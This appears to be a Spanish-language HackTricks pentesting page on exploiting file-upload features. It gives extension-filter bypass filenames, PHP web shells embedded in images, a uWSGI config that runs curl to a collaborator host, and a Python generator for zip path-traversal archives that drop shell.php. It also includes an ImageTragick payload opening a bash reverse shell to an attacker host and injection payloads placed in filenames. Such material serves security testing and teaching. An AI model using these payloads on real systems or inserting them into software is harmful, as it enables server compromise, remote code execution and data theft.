# Carga de Archivos

{{#include ../../banners/hacktricks-training.md}}

## Metodología General de Carga de Archivos

Otras extensiones útiles:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Trabajando en PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass de comprobaciones de extensiones de archivos

1. Si aplica, **verifica** las **extensiones anteriores.** También pruébalas usando algunas **letras mayúsculas**: _pHp, .pHP5, .PhAr ..._
2. _Verifica **agregando una extensión válida antes** de la extensión de ejecución (usa también las extensiones anteriores):_
- _file.png.php_
- _file.png.Php5_
3. Intenta agregar **caracteres especiales al final.** Podrías usar Burp para **bruteforce** todos los caracteres **ascii** y **Unicode**. (_Ten en cuenta que también puedes intentar usar las **extensiones** mencionadas **anteriormente**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Intenta eludir las protecciones **engañando al analizador de extensiones** del lado del servidor con técnicas como **duplicar** la **extensión** o **agregar datos basura** (**bytes nulos**) entre extensiones. _También puedes usar las **extensiones anteriores** para preparar una mejor carga._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Agrega **otra capa de extensiones** a la verificación anterior:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Intenta poner la **extensión exec antes de la extensión válida** y reza para que el servidor esté mal configurado. (útil para explotar configuraciones incorrectas de Apache donde cualquier cosa con la extensión **_**.php**_**, pero** no necesariamente terminando en .php** ejecutará código):
- _ej: file.php.png_
7. Usando **NTFS alternate data stream (ADS)** en **Windows**. En este caso, se insertará un carácter de dos puntos “:” después de una extensión prohibida y antes de una permitida. Como resultado, se creará un **archivo vacío con la extensión prohibida** en el servidor (por ejemplo, “file.asax:.jpg”). Este archivo podría ser editado más tarde usando otras técnicas como usar su nombre de archivo corto. El patrón “**::$data**” también se puede usar para crear archivos no vacíos. Por lo tanto, agregar un carácter de punto después de este patrón también podría ser útil para eludir más restricciones (por ejemplo, “file.asp::$data.”)
8. Intenta romper los límites del nombre de archivo. La extensión válida se corta. Y el PHP malicioso se queda. AAA<--SNIP-->AAA.php

```
# Linux máximo 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # menos 4 aquí y agregando .png
# Sube el archivo y verifica la respuesta cuántos caracteres permite. Digamos 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Haz la carga
AAA<--SNIP 232 A-->AAA.php.png
```

### Bypass de Content-Type, Magic Number, Compresión y Redimensionamiento

- Eludir las comprobaciones de **Content-Type** configurando el **valor** del **header** de **Content-Type** a: _image/png_, _text/plain_, application/octet-stream_
1. Lista de palabras de Content-Type: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Eludir la comprobación de **magic number** agregando al principio del archivo los **bytes de una imagen real** (confundir el comando _file_). O introducir el shell dentro de los **metadatos**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` o también podrías **introducir la carga directamente** en una imagen:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Si **se está agregando compresión a tu imagen**, por ejemplo usando algunas bibliotecas estándar de PHP como [PHP-GD](https://www.php.net/manual/fr/book.image.php), las técnicas anteriores no serán útiles. Sin embargo, podrías usar el **chunk PLTE** [**técnica definida aquí**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para insertar algún texto que **sobreviva a la compresión**.
- [**Github con el código**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- La página web también podría estar **redimensionando** la **imagen**, usando por ejemplo las funciones de PHP-GD `imagecopyresized` o `imagecopyresampled`. Sin embargo, podrías usar el **chunk IDAT** [**técnica definida aquí**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para insertar algún texto que **sobreviva a la compresión**.
- [**Github con el código**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Otra técnica para hacer una carga que **sobreviva a un redimensionamiento de imagen**, usando la función de PHP-GD `thumbnailImage`. Sin embargo, podrías usar el **chunk tEXt** [**técnica definida aquí**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para insertar algún texto que **sobreviva a la compresión**.
- [**Github con el código**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Otros trucos a verificar

- Encuentra una vulnerabilidad para **renombrar** el archivo ya subido (para cambiar la extensión).
- Encuentra una vulnerabilidad de **Inclusión de Archivos Locales** para ejecutar el backdoor.
- **Posible divulgación de información**:
1. Sube **varias veces** (y al **mismo tiempo**) el **mismo archivo** con el **mismo nombre**
2. Sube un archivo con el **nombre** de un **archivo** o **carpeta** que **ya existe**
3. Subiendo un archivo con **“.”, “..”, o “…” como su nombre**. Por ejemplo, en Apache en **Windows**, si la aplicación guarda los archivos subidos en el directorio “/www/uploads/”, el nombre de archivo “.” creará un archivo llamado “uploads” en el directorio “/www/”.
4. Sube un archivo que puede no ser eliminado fácilmente como **“…:.jpg”** en **NTFS**. (Windows)
5. Sube un archivo en **Windows** con **caracteres inválidos** como `|<>*?”` en su nombre. (Windows)
6. Sube un archivo en **Windows** usando **nombres reservados** (**prohibidos**) como CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, y LPT9.
- Intenta también **subir un ejecutable** (.exe) o un **.html** (menos sospechoso) que **ejecutará código** cuando sea accidentalmente abierto por la víctima.

### Trucos especiales de extensión

Si estás intentando subir archivos a un **servidor PHP**, [echa un vistazo al truco de **.htaccess** para ejecutar código](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Si estás intentando subir archivos a un **servidor ASP**, [echa un vistazo al truco de **.config** para ejecutar código](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Los archivos `.phar` son como los `.jar` para java, pero para php, y pueden ser **usados como un archivo php** (ejecutándolo con php, o incluyéndolo dentro de un script...)

La extensión `.inc` a veces se usa para archivos php que solo se utilizan para **importar archivos**, por lo que, en algún momento, alguien podría haber permitido que **esta extensión se ejecute**.

## **Jetty RCE**

Si puedes subir un archivo XML en un servidor Jetty, puedes obtener [RCE porque **nuevos \*.xml y \*.war son procesados automáticamente**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Así que, como se menciona en la siguiente imagen, sube el archivo XML a `$JETTY_BASE/webapps/` y ¡espera el shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Para una exploración detallada de esta vulnerabilidad, consulta la investigación original: [Explotación de RCE en uWSGI](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Las vulnerabilidades de Ejecución Remota de Comandos (RCE) pueden ser explotadas en servidores uWSGI si se tiene la capacidad de modificar el archivo de configuración `.ini`. Los archivos de configuración de uWSGI aprovechan una sintaxis específica para incorporar variables "mágicas", marcadores de posición y operadores. Notablemente, el operador '@', utilizado como `@(filename)`, está diseñado para incluir el contenido de un archivo. Entre los diversos esquemas soportados en uWSGI, el esquema "exec" es particularmente potente, permitiendo la lectura de datos de la salida estándar de un proceso. Esta característica puede ser manipulada para fines nefastos como Ejecución Remota de Comandos o Escritura/lectura de Archivos Arbitrarios cuando se procesa un archivo de configuración `.ini`.

Considera el siguiente ejemplo de un archivo `uwsgi.ini` dañino, que muestra varios esquemas:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
La ejecución de la carga útil ocurre durante el análisis del archivo de configuración. Para que la configuración se active y se analice, el proceso de uWSGI debe reiniciarse (potencialmente después de un fallo o debido a un ataque de Denegación de Servicio) o el archivo debe configurarse para recargarse automáticamente. La función de recarga automática, si está habilitada, recarga el archivo a intervalos especificados al detectar cambios.

Es crucial entender la naturaleza laxa del análisis del archivo de configuración de uWSGI. Específicamente, la carga útil discutida puede insertarse en un archivo binario (como una imagen o PDF), ampliando aún más el alcance de la explotación potencial.

## **wget File Upload/SSRF Trick**

En algunas ocasiones, puede encontrar que un servidor está utilizando **`wget`** para **descargar archivos** y puede **indicar** la **URL**. En estos casos, el código puede estar verificando que la extensión de los archivos descargados esté dentro de una lista blanca para asegurar que solo se descarguen archivos permitidos. Sin embargo, **esta verificación puede ser eludida.**\
La **longitud máxima** de un **nombre de archivo** en **linux** es **255**, sin embargo, **wget** trunca los nombres de archivo a **236** caracteres. Puede **descargar un archivo llamado "A"\*232+".php"+".gif"**, este nombre de archivo **eludirá** la **verificación** (ya que en este ejemplo **".gif"** es una **extensión válida**) pero `wget` **renombrará** el archivo a **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Tenga en cuenta que **otra opción** que puede estar pensando para eludir esta verificación es hacer que el **servidor HTTP redirija a un archivo diferente**, de modo que la URL inicial eluda la verificación y luego wget descargue el archivo redirigido con el nuevo nombre. Esto **no funcionará** **a menos que** wget se esté utilizando con el **parámetro** `--trust-server-names` porque **wget descargará la página redirigida con el nombre del archivo indicado en la URL original**.

## Herramientas

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) es una herramienta poderosa diseñada para ayudar a los Pentesters y Cazadores de Bugs a probar mecanismos de carga de archivos. Aprovecha varias técnicas de recompensas por errores para simplificar el proceso de identificación y explotación de vulnerabilidades, asegurando evaluaciones exhaustivas de aplicaciones web.

## De la carga de archivos a otras vulnerabilidades

- Establezca **filename** en `../../../tmp/lol.png` y trate de lograr un **path traversal**
- Establezca **filename** en `sleep(10)-- -.jpg` y puede que logre una **inyección SQL**
- Establezca **filename** en `<svg onload=alert(document.domain)>` para lograr un XSS
- Establezca **filename** en `; sleep 10;` para probar alguna inyección de comandos (más [trucos de inyección de comandos aquí](../command-injection.md))
- [**XSS** en la carga de archivos de imagen (svg)](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** archivo **upload** + **XSS** = [**explotación de Service Workers**](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE en la carga de svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Redirección abierta** a través de la carga de archivos svg](../open-redirect.md#open-redirect-uploading-svg-files)
- Pruebe **diferentes cargas útiles svg** de [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famosa vulnerabilidad **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Si puede **indicar al servidor web que capture una imagen de una URL**, podría intentar abusar de un [SSRF](../ssrf-server-side-request-forgery/index.html). Si esta **imagen** va a ser **guardada** en algún sitio **público**, también podría indicar una URL de [https://iplogger.org/invisible/](https://iplogger.org/invisible/) y **robar información de cada visitante**.
- [**XXE y CORS** eludir con carga de PDF-Adobe](pdf-upload-xxe-and-cors-bypass.md)
- PDFs especialmente diseñados para XSS: La [siguiente página presenta cómo **inyectar datos PDF para obtener ejecución de JS**](../xss-cross-site-scripting/pdf-injection.md). Si puede cargar PDFs, podría preparar un PDF que ejecute JS arbitrario siguiendo las indicaciones dadas.
- Cargue el \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) contenido para verificar si el servidor tiene algún **antivirus**
- Verifique si hay algún **límite de tamaño** al cargar archivos

Aquí hay una lista de las 10 principales cosas que puede lograr al cargar (de [aquí](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: XSS almacenado / SSRF / XXE
3. **GIF**: XSS almacenado / SSRF
4. **CSV**: inyección CSV
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : inyección HTML / XSS / redirección abierta
8. **PNG / JPEG**: ataque de inundación de píxeles (DoS)
9. **ZIP**: RCE a través de LFI / DoS
10. **PDF / PPTX**: SSRF / XXE CIEGO

#### Extensión de Burp

{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Bytes de encabezado mágicos

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Consulte [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) para otros tipos de archivos.

## Carga de archivos Zip/Tar descomprimidos automáticamente

Si puede cargar un ZIP que se va a descomprimir dentro del servidor, puede hacer 2 cosas:

### Symlink

Cargue un enlace que contenga enlaces simbólicos a otros archivos, luego, al acceder a los archivos descomprimidos, accederá a los archivos vinculados:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decompress in different folders

La creación inesperada de archivos en directorios durante la descompresión es un problema significativo. A pesar de las suposiciones iniciales de que esta configuración podría proteger contra la ejecución de comandos a nivel de SO a través de cargas de archivos maliciosos, el soporte de compresión jerárquica y las capacidades de recorrido de directorios del formato de archivo ZIP pueden ser explotados. Esto permite a los atacantes eludir restricciones y escapar de directorios de carga seguros manipulando la funcionalidad de descompresión de la aplicación objetivo.

Un exploit automatizado para crear tales archivos está disponible en [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). La utilidad se puede usar como se muestra:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Además, el **truco de symlink con evilarc** es una opción. Si el objetivo es apuntar a un archivo como `/flag.txt`, se debe crear un symlink a ese archivo en su sistema. Esto asegura que evilarc no encuentre errores durante su operación.

A continuación se muestra un ejemplo de código Python utilizado para crear un archivo zip malicioso:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusando de la compresión para el file spraying**

Para más detalles **consulta la publicación original en**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creando un Shell PHP**: Se escribe código PHP para ejecutar comandos pasados a través de la variable `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying y Creación de Archivos Comprimidos**: Se crean múltiples archivos y se ensambla un archivo zip que contiene estos archivos.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modificación con un Editor Hexadecimal o vi**: Los nombres de los archivos dentro del zip se alteran usando vi o un editor hexadecimal, cambiando "xxA" a "../" para atravesar directorios.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Sube este contenido con una extensión de imagen para explotar la vulnerabilidad **(ImageMagick , 7.0.1-1)** (forma del [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incrustar Shell PHP en PNG

Incrustar un shell PHP en el chunk IDAT de un archivo PNG puede eludir efectivamente ciertas operaciones de procesamiento de imágenes. Las funciones `imagecopyresized` e `imagecopyresampled` de PHP-GD son particularmente relevantes en este contexto, ya que se utilizan comúnmente para redimensionar y re-muestrear imágenes, respectivamente. La capacidad del shell PHP incrustado para permanecer inalterado por estas operaciones es una ventaja significativa para ciertos casos de uso.

Una exploración detallada de esta técnica, incluyendo su metodología y aplicaciones potenciales, se proporciona en el siguiente artículo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Este recurso ofrece una comprensión completa del proceso y sus implicaciones.

Más información en: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Archivos Políglota

Los archivos políglota sirven como una herramienta única en ciberseguridad, actuando como camaleones que pueden existir válidamente en múltiples formatos de archivo simultáneamente. Un ejemplo intrigante es un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un híbrido que funciona tanto como un GIF como un archivo RAR. Tales archivos no se limitan a esta combinación; combinaciones como GIF y JS o PPT y JS también son factibles.

La utilidad principal de los archivos políglota radica en su capacidad para eludir medidas de seguridad que filtran archivos según su tipo. La práctica común en varias aplicaciones implica permitir solo ciertos tipos de archivos para subir—como JPEG, GIF o DOC—para mitigar el riesgo que presentan formatos potencialmente dañinos (por ejemplo, archivos JS, PHP o Phar). Sin embargo, un políglota, al conformarse a los criterios estructurales de múltiples tipos de archivos, puede eludir sigilosamente estas restricciones.

A pesar de su adaptabilidad, los políglota enfrentan limitaciones. Por ejemplo, mientras un políglota podría encarnar simultáneamente un archivo PHAR (PHp ARchive) y un JPEG, el éxito de su carga podría depender de las políticas de extensiones de archivo de la plataforma. Si el sistema es estricto respecto a las extensiones permitidas, la mera dualidad estructural de un políglota puede no ser suficiente para garantizar su carga.

Más información en: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Subir JSON válidos como si fuera PDF

Cómo evitar detecciones de tipo de archivo subiendo un archivo JSON válido incluso si no está permitido, simulando un archivo PDF (técnicas de **[este blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Mientras los bytes mágicos `%PDF` estén en los primeros 1024 bytes, es válido (obtener ejemplo del post)
- **`pdflib` library**: Agregar un formato PDF falso dentro de un campo del JSON para que la biblioteca piense que es un pdf (obtener ejemplo del post)
- **`file` binary**: Puede leer hasta 1048576 bytes de un archivo. Solo crea un JSON más grande que eso para que no pueda analizar el contenido como un json y luego dentro del JSON pon la parte inicial de un PDF real y pensará que es un PDF

## Referencias

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)

{{#include ../../banners/hacktricks-training.md}}
